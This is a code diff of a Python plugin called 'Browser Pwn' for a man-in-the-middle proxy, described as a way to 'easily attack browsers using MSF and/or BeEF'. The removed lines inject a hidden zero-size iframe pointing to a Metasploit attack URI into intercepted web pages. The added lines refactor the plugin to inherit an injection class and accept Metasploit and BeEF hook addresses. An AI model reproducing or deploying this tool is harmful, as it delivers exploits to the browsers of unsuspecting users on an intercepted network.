@@ -1,35 +1,19 @@
 import os,subprocess,logging,time
+from plugins.Inject import Inject
 from plugins.plugin import Plugin
-from MITMUtils import *
 
-class BrowserPwn(Plugin):
+class BrowserPwn(Inject,Plugin):
     name = "Browser Pwn"
     optname = "browserpwn"
-    implements = ["handleResponse"]
-    has_opts = True
-    log_level = logging.DEBUG
+    desc = "Easily attack browsers using MSF and/or BeEF.\nInherits from Inject."
     def initialize(self,options):
         '''Called if plugin is enabled, passed the options namespace'''
-        self.options = options
-        self.msf_uri = options.msf_uri
-        self.ctable = {}
-    def handleResponse(self,request,data):
-        #We throttle to only inject once every two seconds per client
-        #If you have MSF on another host, you may need to check prior to injection
-        #print "http://" + request.client.getRequestHostname() + request.uri
-        ip = request.client.getClientIP()
-        if ip not in self.ctable or time.time()-self.ctable[ip]>2:
-
-            data = insert_html(request.client,data,post=
-            [
-                ("</body>",'<iframe src=\"%s\" height=0%% width=0%%></iframe>'%(self.msf_uri)),
-            ])
-            self.ctable[ip] = time.time()
-            logging.info("Injected malicious iframe for browser pwnage.")
-            return {'request':request,'data':data}
-        else:
-            return
-
+        Inject.initialize(self,options)
+        self.html_src = options.msf_uri
+        self.js_src = options.js_url
+        self.rate_limit = 2
     def add_options(self,options):
-        options.add_argument("--msf-uri",type=str,default="http://127.0.0.1:8080/",
+        options.add_argument("--msf-uri",type=str,
                 help="The attack URI given to you by MSF")
+        options.add_argument("--beef-uri",type=str,
+                help="The attack URI given to you by BeEF")
